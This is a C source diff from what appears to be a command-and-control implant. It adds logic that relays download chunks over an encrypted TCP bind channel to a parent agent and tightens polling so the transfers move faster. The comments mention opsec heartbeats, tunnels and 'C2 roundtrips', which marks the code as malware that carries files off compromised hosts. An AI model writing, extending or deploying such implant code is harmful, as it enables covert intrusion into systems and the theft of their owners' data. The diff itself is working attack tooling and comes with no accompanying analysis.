@@ -473,6 +473,35 @@ void nax_tcp_bind_main(NaxAgent *a) {
 
             /* Tunnel processing handled by reader threads */
             nax_opsec_heartbeat();
+
+            /* Relay download chunks — TCP cap 256 KB */
+            if (a->download_head) {
+                uint32_t cap = 256 * 1024 + 64;
+                uint8_t *dbuf = (uint8_t *)malloc(cap);
+                if (dbuf) {
+                    uint32_t total = nax_process_downloads(a, dbuf, cap);
+                    uint32_t off = 0;
+                    while (off + 8 <= total) {
+                        uint32_t tid  = (uint32_t)dbuf[off]   | ((uint32_t)dbuf[off+1]<<8)
+                                      | ((uint32_t)dbuf[off+2]<<16) | ((uint32_t)dbuf[off+3]<<24);
+                        uint32_t dlen = (uint32_t)dbuf[off+4] | ((uint32_t)dbuf[off+5]<<8)
+                                      | ((uint32_t)dbuf[off+6]<<16) | ((uint32_t)dbuf[off+7]<<24);
+                        off += 8;
+                        if (off + dlen > total) break;
+                        uint32_t frame_cap = dlen + 256;
+                        uint8_t *frame = (uint8_t *)malloc(frame_cap);
+                        if (frame) {
+                            uint32_t frame_len = frame_cap;
+                            if (nax_build_result(tid, NAX_STATUS_OK, dbuf + off, dlen, frame, &frame_len) == 0)
+                                send_encrypted(a, cli, frame, frame_len);
+                            free(frame);
+                        }
+                        off += dlen;
+                    }
+                    free(dbuf);
+                }
+            }
+
             { /* relay tunnels */
                 uint8_t *tbuf = (uint8_t *)malloc(4*1024*1024);
                 if (tbuf) {
@@ -503,15 +532,42 @@ void nax_tcp_bind_main(NaxAgent *a) {
             /* Step 3: Wait for parent to relay tasks.
              * When sleep=0 (no delay mode) use 50ms so the agent stays
              * responsive. Otherwise add 3s floor for slower C2 roundtrips. */
-            uint32_t poll_ms = (slp == 0) ? 50u : slp + 3000u;
+            /* When downloads are active use a short poll so chunks flow quickly */
+            uint32_t poll_ms = (a->download_head) ? 100u :
+                               (slp == 0)          ? 50u  : slp + 3000u;
             struct pollfd pfd = { .fd = cli, .events = POLLIN };
             int pr = poll(&pfd, 1, (int)poll_ms);
 
             if (pr < 0) { DBG("poll error"); break; }
 
             if (pr == 0) {
-
                 DBG("poll timeout — no tasks from parent");
+                if (a->download_head) {
+                    uint32_t cap = 256 * 1024 + 64;
+                    uint8_t *dbuf = (uint8_t *)malloc(cap);
+                    if (dbuf) {
+                        uint32_t total = nax_process_downloads(a, dbuf, cap);
+                        uint32_t off = 0;
+                        while (off + 8 <= total) {
+                            uint32_t tid  = (uint32_t)dbuf[off]   | ((uint32_t)dbuf[off+1]<<8)
+                                          | ((uint32_t)dbuf[off+2]<<16) | ((uint32_t)dbuf[off+3]<<24);
+                            uint32_t dlen = (uint32_t)dbuf[off+4] | ((uint32_t)dbuf[off+5]<<8)
+                                          | ((uint32_t)dbuf[off+6]<<16) | ((uint32_t)dbuf[off+7]<<24);
+                            off += 8;
+                            if (off + dlen > total) break;
+                            uint32_t frame_cap = dlen + 256;
+                            uint8_t *frame = (uint8_t *)malloc(frame_cap);
+                            if (frame) {
+                                uint32_t frame_len = frame_cap;
+                                if (nax_build_result(tid, NAX_STATUS_OK, dbuf + off, dlen, frame, &frame_len) == 0)
+                                    send_encrypted(a, cli, frame, frame_len);
+                                free(frame);
+                            }
+                            off += dlen;
+                        }
+                        free(dbuf);
+                    }
+                }
                 continue;
             }
 
